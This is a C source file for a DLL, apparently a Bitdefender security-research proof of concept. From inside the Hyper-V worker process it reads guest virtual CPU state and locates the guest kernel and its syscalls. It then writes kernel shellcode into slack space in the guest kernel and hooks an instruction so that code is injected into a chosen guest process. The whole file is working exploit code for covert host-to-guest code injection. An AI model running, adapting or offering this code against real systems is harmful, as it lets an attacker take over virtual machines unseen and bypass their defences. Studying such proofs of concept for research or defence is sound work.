/*
 * Copyright (c) 2025 Bitdefender
 * SPDX-License-Identifier: BSD-3-Clause
 */
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "handle.h"
#include "exceptions.h"
#include "log.h"
#include "vid.h"
#include "memory.h"
#include "cr3.h"
#include "nt.h"
#include "shellcode.h"

#include "..\common\common.h"

#pragma comment(lib, "ntdll.lib")


//
// Main reference for VID API: https://github.com/Wenzel/vid-sys/tree/master/src/hyperv
//

#define MIN_PARTITION_HANDLE        0x200
#define MAX_PARTITION_HANDLE        0x1000
#define MAX_MB_HANDLE               20
#define MAX_KERNEL_PAGES            10000

#define MAX_VCPUS                   64  // If more VPs are present/needed, just increase this.

#define IS_KERNEL_ADDRESS(x)        (((x) & 0x8000000000000000) != 0)

// The state we're interested in saving for every VP.
typedef struct _VCPU_STATE
{
    UINT64  Cr0;
    UINT64  Cr2;
    UINT64  Cr3;
    UINT64  Cr4;
    UINT64  Efer;
    UINT64  Lstar;
    UINT64  Gsb;
    UINT64  Ksb;
    UINT64  Rip;
} VCPU_STATE;

VCPU_STATE gVpStates[MAX_VCPUS];

UINT64 gPtHandle = 0;
UINT64 gMbHandle = 1;
UINT64 gVpCount = 0;
UINT64 gSystemCr3 = 0;

BYTE gZeroPage[4096] = { 0 };       // Zero fill.


//
// FindPartitionHandle
//
_Success_(return)
BOOLEAN
FindPartitionHandle(
    void
)
{
    for (gPtHandle = MIN_PARTITION_HANDLE; gPtHandle < MAX_PARTITION_HANDLE; gPtHandle += 4)
    {
        UINT64 data;

        if (!HandleIsFile((HANDLE)gPtHandle))
        {
            continue;
        }

        // Issue a dummy 8 bytes read, and see if it works.
        if (MemReadWritePhysicalMemory(0, sizeof(data), (PBYTE)&data, FALSE))
        {
            return TRUE;
        }
    }

    return FALSE;
}


//
// FindVirtualProcessors
//
_Success_(return)
UINT64
FindVirtualProcessors(
    void
)
{
    while (gVpCount < MAX_VCPUS)
    {
        UINT32 codes[] = { 
            0x00040000, // CR0
            0x00040001, // CR2
            0x00040002, // CR3
            0x00040003, // CR4
            0x00080001, // IA32_EFER
            0x00080009, // IA32_LSTAR
            0x00060005, // IA32_GS_BASE
            0x00080002, // IA32_KERNEL_GS_BASE
            0x00020010, // RIP
        };

        REGISTER_VALUE values[ARRAYSIZE(codes)];

        if (!VidGetVirtualProcessorState(gPtHandle, gVpCount, codes, ARRAYSIZE(codes), values))
        {
            // We stop as soon we can't query a VP; it means we reached the end.
            break;
        }

        // Capture the VP state. Note that the state captured may belong to a user-mode process, 
        // and it may become invalid at some point.
        gVpStates[gVpCount].Cr0 = values[0].Reg64;
        gVpStates[gVpCount].Cr2 = values[1].Reg64;
        gVpStates[gVpCount].Cr3 = values[2].Reg64;
        gVpStates[gVpCount].Cr4 = values[3].Reg64;
        gVpStates[gVpCount].Efer = values[4].Reg64;
        gVpStates[gVpCount].Lstar = values[5].Reg64;
        gVpStates[gVpCount].Rip = values[8].Reg64;

        // Make sure the VP is running in long mode. We test LMA (Long Mode Active), bit 10, in IA32_EFER.
        if ((gVpStates[gVpCount].Efer & (1ull << 10)) == 0)
        {
            LogMessage("[INFO] Guest OS not running in long mode!\n");
            break;
        }

        if (IS_KERNEL_ADDRESS(values[6].Reg64))
        {
            // We're in kernel context, the current IA32_GS_BASE is the kernel one.
            gVpStates[gVpCount].Ksb = values[6].Reg64;
            gVpStates[gVpCount].Gsb = values[7].Reg64;
        }
        else
        {
            // We're in user context, the current IA32_KERNEL_GS_BASE is the kernel one.
            gVpStates[gVpCount].Ksb = values[7].Reg64;
            gVpStates[gVpCount].Gsb = values[6].Reg64;
        }

        // Get the current process ID.
        UINT64 pid = GetProcessId(&gVpStates[gVpCount]);

        LogValue("[INFO] State for VCPU index ", gVpCount);
        LogValue("[INFO]         RIP            = ", gVpStates[gVpCount].Rip);
        LogValue("[INFO]         CR0            = ", gVpStates[gVpCount].Cr0);
        LogValue("[INFO]         CR2            = ", gVpStates[gVpCount].Cr2);
        LogValue("[INFO]         CR3            = ", gVpStates[gVpCount].Cr3);
        LogValue("[INFO]         CR4            = ", gVpStates[gVpCount].Cr4);
        LogValue("[INFO]         IA32_EFER      = ", gVpStates[gVpCount].Efer);
        LogValue("[INFO]         IA32_LSTAR     = ", gVpStates[gVpCount].Lstar);
        LogValue("[INFO]         IA32_KGS_BASE  = ", gVpStates[gVpCount].Ksb);
        LogValue("[INFO]         IA32_GS_BASE   = ", gVpStates[gVpCount].Gsb);
        LogValue("[INFO]         PID            = ", pid);

        gVpCount++;
    }

    return gVpCount;
}


//
// FindMemoryBlockAndSystemCr3
//
_Success_(return)
BOOLEAN
FindMemoryBlockAndSystemCr3(
    void
)
{
    //
    // This code has two main roles:
    // 1. Find a viable CR3 value. We can also use whatever CR3 was returned by a VP state query, but it
    // may belong to a process that may terminate soon. Instead, we search for the CR3 with the smallest
    // physical address, which is usually used by the System process.
    // 2. Find the initial memory block index. Accesses should work with memory block 1, but that is good
    // enough just to know whether we have a good partition handle. Memory block 1 may NOT map regular
    // RAM. To find the first memory block that maps regular RAM, we will be able to find a good system
    // cr3.
    //
    for (; gMbHandle < MAX_MB_HANDLE; gMbHandle++)
    {
        gSystemCr3 = Cr3FindSystem();
        if (gSystemCr3 != 0)
        {
            return TRUE;
        }
    }

    return FALSE;
}


//
// FindNtoskrnl
//
_Success_(return)
BOOLEAN
FindNtoskrnl(
    void
)
{
    UINT64 kern, count;

    // We start the search at the LSTAR (SYSCALL_DESCRIPTOR) target address. Searching max 10K pages.
    for (kern = gVpStates[0].Lstar & 0xFFFFFFFFFFFF0000, count = 0; count < MAX_KERNEL_PAGES; count++, kern -= 0x1000)
    {
        if (NtoskrnlInit(kern, gSystemCr3))
        {
            return TRUE;
        }
    }

    return FALSE;
}


//
// Inject
//
__declspec(dllexport)
DWORD __stdcall 
Inject(
    VMINJECT_PARAMETER *Param
    )
{
    UINT64 target, slack;
    DWORD ret = 1;

    //
    // Add an exception handler, so we don't crash vmwp.exe in case of invalid handles accesses.
    //
    if (!ExceptionsInit())
    {
        LogMessage("[ERROR] Exception handler initialization failed!\n");
        goto cleanup_and_exit;
    }

    //
    // Create a log file.
    //
    if (!LogInit())
    {
        LogMessage("[ERROR] LOG initialization failed!\n");
        goto cleanup_and_exit;
    }

    //
    // Initialize VID.
    //
    if (!VidInit())
    {
        LogMessage("[ERROR] VID initialization failed!\n");
        goto cleanup_and_exit;
    }

    //
    // Find the partition handle.
    //
    if (!FindPartitionHandle())
    {
        LogValue("[ERROR] Could not find a valid partition handle: ", GetLastError());
        goto cleanup_and_exit;
    }

    LogValue("[INFO] Partition handle: ", gPtHandle);

    //
    // Get the VPs states.
    //
    if (0 == FindVirtualProcessors())
    {
        LogMessage("[INFO] No valid VPs found!\n");
        goto cleanup_and_exit;
    }

    LogValue("[INFO] Number of available VPs: ", gVpCount);

    //
    // Find initial memory block & system cr3.
    //
    if (!FindMemoryBlockAndSystemCr3())
    {
        LogMessage("[INFO] Could not find a viable CR3!\n");
        goto cleanup_and_exit;
    }

    LogValue("[INFO] Initial memory block: ", gMbHandle);
    LogValue("[INFO] Viable CR3: ", gSystemCr3);

    //
    // Find the kernel base.
    //
    if (!FindNtoskrnl())
    {
        LogMessage("[ERROR] Could not find the notskrnl.exe base address!\n");
        goto cleanup_and_exit;
    }


    //
    // Locate our required functions (SYSCALL_DESCRIPTOR linkages) inside ntoskrnl. We do this by using the known
    // system call numbers, so make sure to change those values when running this PoC on a different 
    // Windows version.
    //
    SYSCALLS syscalls;

    if (!NtoskrnlFindSyscalls(&syscalls))
    {
        LogMessage("[ERROR] Could not find the needed syscall functions!\n");
        goto cleanup_and_exit;
    }

    LogValue("[INFO] ZwOpenProcess: ", syscalls.ZwOpenProcess);
    LogValue("[INFO] ZwAllocateVirtualMemory: ", syscalls.ZwAllocateVirtualMemory);
    LogValue("[INFO] ZwWritevirtualMemory: ", syscalls.ZwWriteVirtualMemory);
    LogValue("[INFO] ZwCreateThreadEx: ", syscalls.ZwCreateThreadEx);


    //
    // Prepare the kernel shellcode.
    //
    *((UINT64*)(&gKernelShellcode[OFS_ZWOPENPROCESS]))           = syscalls.ZwOpenProcess;
    *((UINT64*)(&gKernelShellcode[OFS_ZWALLOCATEVIRTUALMEMORY])) = syscalls.ZwAllocateVirtualMemory;
    *((UINT64*)(&gKernelShellcode[OFS_ZWWRITEVIRTUALMEMORY]))    = syscalls.ZwWriteVirtualMemory;
    *((UINT64*)(&gKernelShellcode[OFS_ZWCREATETHREADEX]))        = syscalls.ZwCreateThreadEx;
    *((UINT64 *)(&gKernelShellcode[OFS_PID]))                    = Param->Pid;


    //
    // Search for a good hook candidate.
    //
    target = NtoskrnlFindHookableInstruction();
    if (0 == target)
    {
        LogMessage("[ERROR] Could not find target instruction!\n");
        goto cleanup_and_exit;
    }

    LogValue("[INFO] Found hookable instruction: ", target);


    //
    // Search for adequate slack space.
    //
    slack = NtoskrnlFindSlackSpace(sizeof(gKernelShellcode));
    if (0 == slack)
    {
        LogMessage("[ERROR] Could not find slack space!\n");
        goto cleanup_and_exit;
    }

    LogValue("[INFO] Found slack space: ", slack);


    //
    // Set the semaphore inside the KPCRs. We do this so only a single VP gets to execute the payload.
    //
    for (UINT64 i = 1; i < gVpCount; i++)
    {
        DWORD one = 1;

        if (!MemReadWriteVirtuallMemory(gVpStates[i].Ksb + 0x54, gSystemCr3, 4, (PBYTE)&one, TRUE))
        {
            LogValue("[WARNING] Could not set the semaphore for VP: ", i);
            LogValue("[WARNING] Could not set the semaphore for VP: ", gVpStates[i].Ksb);
        }
    }


    //
    // Install the shellcode.
    //
    if (!MemReadWriteVirtuallMemory(slack, gSystemCr3, sizeof(gKernelShellcode), gKernelShellcode, TRUE))
    {
        LogMessage("[ERROR] Failed injecting the shellcode in kernel slack space!\n");
        goto cleanup_and_exit;
    }

    LogValue("[INFO] Shellcode injected inside slack space: ", slack);


    //
    // Hook the target instruction.
    //
    UINT32 distance;
    BYTE call[5];
    BYTE orig[5];
    
    distance = (UINT32)(slack - (target + 5));
    call[0] = 0xE8;
    call[1] = distance & 0xFF;
    call[2] = (distance >> 8) & 0xFF;
    call[3] = (distance >> 16) & 0xFF;
    call[4] = (distance >> 24) & 0xFF;

    // Read original code.
    if (!MemReadWriteVirtuallMemory(target, gSystemCr3, sizeof(orig), orig, FALSE))
    {
        LogMessage("[ERROR] Could not read original code to be hooked!\n");
        goto cleanup_and_exit;
    }

    // Patch the code with CALL.
    if (!MemReadWriteVirtuallMemory(target, gSystemCr3, sizeof(call), call, TRUE))
    {
        LogMessage("[ERROR] Could not hook code!\n");
        goto cleanup_and_exit;
    }

    LogMessage("[INFO] Code hooked successfully! Waiting for payload to trigger...\n");


    //
    // Sleep. Allow the hook to get triggred.
    //
    Sleep(2500);

    //
    // Restore the original code.
    //
    if (!MemReadWriteVirtuallMemory(target, gSystemCr3, sizeof(orig), orig, TRUE))
    {
        LogMessage("[WARNING] Could not remove the hook!\n");
    }

    LogMessage("[INFO] Hook removed!\n");


    //
    // Wait for any code that was inside the slack to return.
    //
    Sleep(2500);


    //
    // Restore the slack space.
    //
    if (!MemReadWriteVirtuallMemory(slack, gSystemCr3, sizeof(gKernelShellcode), gZeroPage, TRUE))
    {
        LogMessage("[WARNING] Could not remove the hook\n");
    }

    LogMessage("[INFO] Slack removed!\n");


    //
    // Restore the semaphore inside the KPCRs.
    //
    for (UINT64 i = 0; i < gVpCount; i++)
    {
        if (!MemReadWriteVirtuallMemory(gVpStates[i].Ksb + 0x54, gSystemCr3, 4, (PBYTE)&gZeroPage, TRUE))
        {
            LogValue("[WARNING] Could not remove the semaphore for VP: ", i);
        }
    }

    LogMessage("[INFO] Semaphore removed!\n");

    LogMessage("[INFO] Injection successfull!\n");

    ret = 0;

cleanup_and_exit:

    NtoskrnlUninit();

    VidUninit();

    LogUninit();

    ExceptionsUninit();

    return ret;
}


//
// DllMain
//
BOOL APIENTRY
DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
